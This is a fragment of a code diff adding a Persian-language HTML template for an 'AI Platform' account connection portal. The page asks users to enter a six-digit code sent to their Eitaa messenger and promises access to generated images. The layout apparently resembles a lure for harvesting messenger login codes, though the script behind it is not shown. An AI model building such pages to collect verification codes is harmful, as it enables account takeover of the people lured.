+      <button class="secondaryButton backButton" type="button">تغییر شماره موبایل</button>
+    </div>
+
+    <div class="screen" id="codeScreen">
+      <div class="formIcon">✉</div>
+      <h2>کد احراز هویت ارسال شد</h2>
+      <p class="description">کد احراز هویت پلتفرم به ایتای شما ارسال شد. کد شش‌رقمی را در کادرهای زیر وارد کنید.</p>
+      <div class="codeBoxes" id="codeBoxes">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+        <input type="tel" inputmode="numeric" maxlength="1">
+      </div>
+      <div class="codeInfo">
+        <div class="message" id="codeMessage"></div>
+        <button class="resendButton" id="resendButton" disabled>ارسال مجدد تا ۶۰ ثانیه</button>
+      </div>
+      <button class="primaryButton" id="codeButton" disabled>تأیید و اتصال حساب <span>←</span></button>
+      <button class="secondaryButton backButton" type="button">تغییر شماره موبایل</button>
+    </div>
+
+    <div class="screen successScreen" id="successScreen">
+      <div class="successIcon">✓</div>
+      <h2>حساب با موفقیت متصل شد</h2>
+      <p class="description">اتصال حساب ایتا کامل شد. اکنون می‌توانید عکس‌های ساخته‌شده را مشاهده کنید.</p>
+      <div class="connectedAccount" id="connectedAccount">حساب متصل شد</div>
+      <button class="primaryButton" id="restartButton">اتصال حساب دیگر</button>
+    </div>
+
+    <footer>AI Platform · Account Connection Portal</footer>
+  </section>
+</main>
+__API_SCRIPT__
 </body>
 </html>"""
+
+PAGE_HTML = _SHELL.replace("__API_SCRIPT__", _API_SCRIPT)
